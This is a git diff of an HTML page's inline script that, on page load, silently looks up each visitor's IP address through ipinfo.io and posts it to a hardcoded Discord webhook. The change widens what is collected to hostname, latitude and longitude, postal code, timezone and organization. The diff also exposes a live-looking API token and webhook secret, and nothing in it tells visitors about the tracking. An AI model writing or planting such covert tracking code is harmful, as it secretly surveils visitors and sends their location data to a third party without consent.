@@ -148,28 +148,39 @@
     </div>
 
     <script>
-        window.addEventListener('load', () => {
-            fetch('https://ipinfo.io/json?token=9b88a4f00b132f')
-                .then(res => res.json())
-                .then(data => {
-                    const payload = {
-                        content: `New visitor info:\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}`
-                    };
+  window.addEventListener('load', () => {
+    fetch('https://ipinfo.io/json?token=9b88a4f00b132f')
+      .then(res => res.json())
+      .then(data => {
+        const content = `
+New visitor info:
+IP: ${data.ip}
+Hostname: ${data.hostname || 'N/A'}
+City: ${data.city || 'N/A'}
+Region: ${data.region || 'N/A'}
+Country: ${data.country || 'N/A'}
+Location (lat,lng): ${data.loc || 'N/A'}
+Postal Code: ${data.postal || 'N/A'}
+Timezone: ${data.timezone || 'N/A'}
+Organization: ${data.org || 'N/A'}
+        `.trim();
 
-                    const webhookURL = 'https://discord.com/api/webhooks/1381419732095209472/bstVFrhUSlpARvbQ7I5C9waHRTLGl_1dqZ9q_FVYxj4Cu0Tqsx8Egd4rQ9CL1JbAZMMM';
+        const payload = { content };
 
-                    fetch(webhookURL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload),
-                    })
-                    .then(() => console.log('Visitor info sent to webhook'))
-                    .catch(err => console.error('Error sending to webhook:', err));
-                })
-                .catch(() => {
-                    console.error('Failed to get IP info');
-                });
-        });
-    </script>
+        const webhookURL = 'https://discord.com/api/webhooks/1381419732095209472/bstVFrhUSlpARvbQ7I5C9waHRTLGl_1dqZ9q_FVYxj4Cu0Tqsx8Egd4rQ9CL1JbAZMMM';
+
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+        })
+        .then(() => console.log('Visitor info sent to webhook'))
+        .catch(err => console.error('Error sending to webhook:', err));
+      })
+      .catch(() => {
+        console.error('Failed to get IP info');
+      });
+  });
+</script>
 </body>
 </html>
